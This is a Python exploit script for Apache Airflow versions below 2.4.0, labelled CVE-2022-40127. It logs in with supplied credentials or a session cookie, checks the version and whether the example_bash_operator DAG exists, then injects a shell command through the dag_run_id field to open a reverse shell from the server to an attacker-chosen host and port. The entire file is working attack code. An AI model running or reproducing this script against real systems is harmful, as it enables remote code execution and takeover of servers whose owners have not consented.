import argparse
import re
import requests
import json
from packaging import version

def get_csrf_token(url):
    response = requests.get(url + "/login/")
    pattern = r'<input(?:\s+(?:(?:type|name|id)\s*=\s*"[^"]*"\s*)+)?\s+value="([^"]+)">'
    csrf_token = re.search(pattern, response.text)
    initial_session_cookie = response.cookies.get('session')

    if csrf_token:
        print("[+] CSRF token found.")
        return initial_session_cookie, csrf_token.group(1)
    else:
        print("[-] CSRF token not found. Exiting...")
        exit(1)

def login(url, username, password, cookie, csrf_token):
    response = requests.post(
        url + "/login/",
        headers={
            "Content-Type":"application/x-www-form-urlencoded",
            "Cookie":f"session={cookie}"
        },
        data={"csrf_token": csrf_token, "username": username, "password": password}
    )

    if "Invalid login. Please try again." in response.text:
        print("[+] Login was not successful due to invalid credentials.")
        exit(1)

    elif response.status_code != 200:
        print("[-] Something went wrong with the login process.")

    elif "Set-Cookie" in response.headers:
        session_cookie = response.headers["Set-Cookie"].split(";")[0].split("=")[1]
        print(f"Login was successful. Captured session cookie: {session_cookie}")
        return session_cookie

def check_airflow_version(url, session_cookie):
    response = requests.get(
        url + "/home",
        headers={"Cookie": f"session={session_cookie}"}
    )

    version_str = re.search(r'v(\d+\.\d+\.\d+)', response.text)
    if version_str:
        print(f"[+] Airflow version found: {version_str.group(1)}")
        return version_str.group(1)
    else:
        print("[-] Airflow version not found.")
        exit(1)

def check_example_bash_operator_exists(url, session_cookie):
    endpoint = f'{url}/api/v1/dags'
    headers = {'Cookie': f'session={session_cookie}'}
    response = requests.get(endpoint, headers=headers)
    response_data = response.json()

    if any(dag["dag_id"] == "example_bash_operator" for dag in response_data['dags']):
        return True
    
    return False

def upload_reverse_shell(url, session_cookie, host, port):
        payload = f'\";sh -i >& /dev/tcp/{host}/{port} 0>&1;\""'
        print (f"[+] Using the following payload: {payload}")

        data = {"conf": {},"dag_run_id": payload}

        headers = {
            "accept": "application/json",
            "Content-Type": "application/json",
            "Cookie": f"session={session_cookie}"
        }

        response = requests.post(
            f"{url}/api/v1/dags/example_bash_operator/dagRuns",
            headers=headers,
            json=data
        )

        response_data = response.json()

        if response.status_code == 200:
            print(f"[+] Exploit seems to work. Wait for a connection on port {port}.")
        else:
            print("[-] Something is wrong with the exploit. Here is the response data:")
            print(response.text)
            
def main():
    parser = argparse.ArgumentParser(description="Apache Airflow < 2.4.0 DAG example_bash_operator RCE exploit script (CVE-2022-40127).")
    parser.add_argument("-u", "--username", required=True, help="Airflow username")
    parser.add_argument("-p", "--password", required=True, help="Airflow password")
    parser.add_argument("-url", required=True, help="URL of the Apache Airflow host. Use http(s):// prefix.")
    parser.add_argument("-s", "--session_cookie", help="Session cookie if you already have it")
    parser.add_argument("-a", "--attack", action="store_true", help="Create a reverse shell on the host")
    parser.add_argument("-host", "--rev-shell-host", help="Reverse shell IP/host to bind to from Airflow server")
    parser.add_argument("-port", "--rev-shell-port", help="Reverse shell port to bind to from Airflow server")

    args = parser.parse_args()

    # Check if both username and password or session_cookie are provided
    if not (args.username and args.password) and not args.session_cookie:
        print("[-] Either provide username and password or session cookie.")
        exit(1)

    # Validate URL schema
    url = args.url
    if not url.startswith("http://") and not url.startswith("https://"):
        print("[-] Invalid URL scheme. It should start with 'http://' or 'https://'.")
        exit(1)
    url = url.rstrip("/")

    # Check if both host and port are provided
    if args.attack and not (args.rev_shell_host and args.rev_shell_port):
        print("[-] The host ip and port for the reverse shell to bind to also should be provided in attack mode. Exiting...")
        exit(1)

    # Get the session cookie
    if args.session_cookie:
        session_cookie = args.session_cookie
    else:
        initial_session_cookie, csrf_token = get_csrf_token(url)
        session_cookie = login(url, args.username, args.password, initial_session_cookie, csrf_token)

    airflow_version = check_airflow_version(url, session_cookie)

    if version.parse(airflow_version) < version.parse("2.4.0"):
        print("[+] Version is vulnerable.")
    else:
        print("[-] Not vulnerable. Version is above 2.3.4. Exiting...")

    if  check_example_bash_operator_exists(url, session_cookie):
        print("[+] Yay! The example_bash_operator example DAG exists.")
    else:
        print("[-] No example_bash_operator DAG exists. Exploitation is not possible. Exiting...")
        exit(1)

    if args.attack:
        print("[+] Proceeding with the exploit. Trying to upload reverse shell.")
        upload_reverse_shell(url, session_cookie, args.rev_shell_host, args.rev_shell_port)
    else:
        print("[+] Exploit seems to work. Run the script with \"-a\" option to get a reverse shell.")

if __name__ == "__main__":
    main()
